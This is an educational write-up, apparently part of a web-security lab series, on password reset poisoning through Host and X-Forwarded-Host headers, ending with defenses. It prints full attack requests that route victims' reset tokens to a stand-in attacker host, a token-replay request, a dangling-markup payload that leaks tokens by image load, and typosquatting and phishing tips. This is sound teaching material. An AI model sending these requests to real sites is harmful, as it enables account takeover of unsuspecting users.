# Password Reset Poisoning — The Attack Chain, Step by Step

## 1. Why this chain matters

Password reset poisoning is the single most impactful real-world consequence of Host
header trust issues, because it converts a header-manipulation bug into **full account
takeover** — without needing to compromise credentials, bypass MFA, or find a logic flaw
in the reset flow itself. The flaw is entirely in *how the reset link's domain is chosen*,
not in the cryptographic strength of the token.

This is also a favorite in bug bounty programs because:
- It typically requires zero authentication to trigger (you only need a victim's email
  address or username, which is often easy to obtain or enumerate).
- It is unambiguous, high-severity impact: full account compromise.
- It can sometimes be escalated into account takeover **at scale**, e.g., by combining it
  with email enumeration to mass-trigger poisoned reset emails.

## 2. How a normal password reset flow works

Understanding the legitimate flow is essential before you can see how it's subverted.
A typical implementation:

1. User submits their email/username to a "Forgot password" form.
2. Server confirms the account exists, generates a unique, high-entropy, single-use reset
   token, and stores it associated with that account (usually with an expiry).
3. Server sends an email containing a link like:
   ```
   https://example.com/reset?token=0a1b2c3d4e5f6g7h8i9j
   ```
4. User clicks the link. The server looks up the token, confirms it's valid and unexpired,
   identifies the associated account, and lets the user set a new password. The token is
   then destroyed (single-use).

The security of this entire flow rests on one assumption: **only the legitimate account
owner has access to the inbox that received the link, and therefore only they can ever see
the token.** Password reset poisoning breaks that assumption — not by reading the victim's
email, but by **changing which server the link points to before the email is ever sent.**

## 3. The core vulnerability: where does the domain in the link come from?

When the server builds that reset URL, the domain portion (`example.com` in the example
above) has to come from *somewhere* in the code. There are two ways developers commonly
do this:

**Secure approach:** hardcode the canonical domain in server-side configuration
(`SITE_URL = "https://example.com"`) and always use that fixed value.

**Vulnerable approach:** dynamically build the URL using the **Host header of the incoming
request** (or a trusted-forwarding header like `X-Forwarded-Host`), on the theory that
"the domain the user is currently visiting is whatever domain the reset link should point
to." This sounds reasonable for multi-tenant SaaS platforms with many valid domains — but
it means **whatever Host value the request arrived with becomes the literal domain
embedded in an email that gets sent to someone else.**

That's the entire vulnerability. The reset token's secrecy is no longer protected by
"only the victim's inbox can see it" — it's protected only by "the attacker can't control
the Host header," which, as File 01 demonstrated, is frequently false.

## 4. The attack chain, step by step

### Step 1 — Confirm the reset link domain follows the Host header

Trigger a password reset request for **your own test account** while supplying an
unexpected Host value, and observe the resulting email:

```
POST /forgot-password HTTP/1.1
Host: attacker-controlled-domain.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

email=your-test-account@example.com
```

*Breakdown of what's happening:* you're not attacking your real target's domain validation
yet — you're attacking your own test account specifically to **observe** behavior safely.
The `email` parameter tells the server *which account* to generate a token for (your own).
The `Host` header is the variable under test: you're checking whether the server reflects
this value into the email body/link instead of using a hardcoded internal config value.

If the email you receive contains:
```
https://attacker-controlled-domain.com/reset?token=<valid-token>
```
...the application is vulnerable. You've just proven the link domain is attacker-controlled
*and* you've safely confirmed it without touching anyone else's account.

### Step 2 — Confirm whether validation can be bypassed (if Host is restricted)

If supplying an arbitrary Host outright gets the request blocked, apply the same bypass
techniques covered in File 01 — port-field smuggling, duplicate Host headers, absolute-URI
request lines, or override headers like `X-Forwarded-Host`:

```
POST /forgot-password HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker-controlled-domain.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

email=your-test-account@example.com
```

*Breakdown:* `Host` is left as the legitimate domain so the request is routed normally and
passes any front-end Host validation. But the application code that *builds the reset
email* has been written to prefer `X-Forwarded-Host` when present (because it assumes that
header only ever arrives from a trusted internal proxy). You're exploiting the same gap as
the override-header technique in File 01, but now the payoff is "your domain ends up
embedded in an email sent to a real victim" rather than just a reflected response.

### Step 3 — Weaponize it against the victim

Once you've confirmed the mechanism works (using your own test account), the live attack
against a real victim looks like this:

1. **Obtain the victim's email address or username.** This might come from a leaked
   breach list, public profile information, a billing/contact page, or username
   enumeration on the target's own registration/login flow.

2. **Submit the password reset request on the victim's behalf**, with the poisoned Host
   (or override header) in place:
   ```
   POST /forgot-password HTTP/1.1
   Host: example.com
   X-Forwarded-Host: evil-user.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 23

   email=victim@example.com
   ```
   *Breakdown:* this is identical in structure to Step 2, except the `email` parameter now
   names the **victim's** account. The server has no way to distinguish "the legitimate
   user resetting their own password from a slightly unusual client" from "an attacker
   triggering a reset on someone else's behalf" — password reset requests are, by design,
   meant to be usable by someone who is *not yet authenticated*, since the whole point is
   recovering access. The attacker doesn't need the victim's password, session, or any
   prior access at all.

3. **The victim receives a completely genuine email**, sent from the real application's
   mail server, using the real email template. Nothing about the *sender* looks suspicious.
   The only poisoned element is the domain inside the link:
   ```
   https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
   ```
   This is the critical psychological/technical point: **the email is not phishing in the
   traditional sense** — it didn't come from a spoofed sender, it came from the real
   service, with a real subject line, about a real (attacker-triggered) password reset
   event. Victims (and automated security tooling that pre-fetches links in emails, such
   as some antivirus/email-security gateways) are far more likely to interact with it than
   with an obvious phishing email.

4. **The victim clicks the link** (or it's auto-fetched by a link-prescanning security
   product, which happens more often than most people expect). Their browser sends a
   request to `evil-user.net`, the attacker's server — **carrying the valid, secret reset
   token as a URL query parameter.** The attacker's server logs every incoming request,
   capturing the token.

5. **The attacker immediately replays the captured token against the real application**:
   ```
   GET /reset?token=0a1b2c3d4e5f6g7h8i9j HTTP/1.1
   Host: example.com
   ```
   *Breakdown:* this request goes to the legitimate site (correct `Host` this time — the
   attacker needs the *real* server to accept the token), supplying the token they just
   stole from their own server's access log. Since the token is genuinely valid (it really
   was issued by the real server for the victim's account, and hasn't been used yet), the
   real server happily lets the attacker proceed to "set a new password" for the victim's
   account.

6. **Account takeover is complete.** The attacker sets a password of their choosing and
   logs in as the victim. The legitimate user typically has no idea any of this happened —
   from their perspective, they may have received an odd-looking email and clicked a link
   that didn't seem to work, or never noticed it at all if it was auto-fetched.

### Step 4 — Increasing real-world success rate (industry framing)

In practice, attackers improve the click-through rate of the poisoned email with simple
social engineering, since the email itself is legitimate but the domain in the link is the
only "tell":
- Sending a preceding, fake "we noticed suspicious activity on your account" message
  through another channel to prime the victim to expect (and trust) a reset email.
- Using a typosquatted or visually similar domain for the capture server
  (`exarnple-reset.net`, `examp1e.com`) so a quick glance at the link doesn't raise
  suspicion.
- Timing the attack for when victims are less likely to scrutinize links carefully (e.g.,
  alongside a real, publicized incident at the target company, when "security-related"
  emails are expected).

## 5. Variant: password reset poisoning via dangling markup

Even when the application **doesn't** let you fully control the reset link's domain
(e.g., it's hardcoded), the Host header may still be reflected somewhere else in the email
body — and if the email client renders any HTML at all, that reflection can be abused via a
**dangling markup injection** to leak the token through a different mechanism entirely.

```
POST /forgot-password HTTP/1.1
Host: example.com"><img src='//evil-user.net/?
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

email=victim@example.com
```

*Breakdown:* this isn't trying to replace the link's domain. Instead, it injects an
**unterminated HTML attribute/tag** into wherever the Host value gets reflected in the
email's HTML body (for example, into a footer that says "this email was sent in response
to a request from example.com"). Because the injected markup is deliberately left
*unclosed* (`<img src='//evil-user.net/?`), the HTML parser keeps consuming everything that
comes *after* it in the document — including the real password reset link and token that
appear later in the email body — and folds it all into the `src` attribute of the injected
`<img>` tag. When the victim's email client renders the message and tries to load that
image, it sends a request to `evil-user.net` with the **stolen token appended to the URL
as part of the broken-out attribute value.**

*Why this works even though JavaScript doesn't:* email clients overwhelmingly strip
`<script>` tags and refuse to execute JavaScript for security reasons, which is why
classic reflected XSS via the Host header is normally considered "useless" in an email
context (there's no victim browser session to attack with a script). But most email
clients **do** still load remote images by default, and dangling markup attacks don't
need any script execution at all — they just need an HTML parser to keep consuming
content into an unclosed tag, which is a much lower bar to clear.

## 6. Defenses specific to this chain (and why they work)

- **Never derive the password reset link's domain from request data.** Use a fixed,
  server-side-configured canonical URL. This single fix removes the entire chain described
  in Sections 3–4, because the attacker loses the ability to choose the domain at all.
- **Bind the token to additional context at generation time**, such as the IP address or
  session that requested the reset, and re-validate that context when the token is
  redeemed. This doesn't stop the email from being poisoned, but it can prevent the
  *attacker's* redemption request from succeeding if the context doesn't match — though
  this is a defense-in-depth measure, not a substitute for fixing the root cause.
- **Treat the password reset email body as untrusted output wherever request data is
  reflected into it**, and HTML-encode accordingly, to close off the dangling-markup
  variant even if some non-domain reflection of Host data is considered "necessary" by
  the application.
- **Short token expiry and strict single-use enforcement** reduce the attack window but do
  not prevent the chain — a fast attacker (or an automated capture server) can replay a
  stolen token within seconds of the victim's email client fetching the link.

File 03 covers the broader header-trust landscape that enables Step 2 of this chain in
depth — `X-Forwarded-Host`, `X-Host`, `Forwarded`, and the related but distinct problem of
`X-Forwarded-For` trust issues. File 04 maps this entire chain, and its dangling-markup
variant, to the exact PortSwigger Academy labs that let you practice it safely.
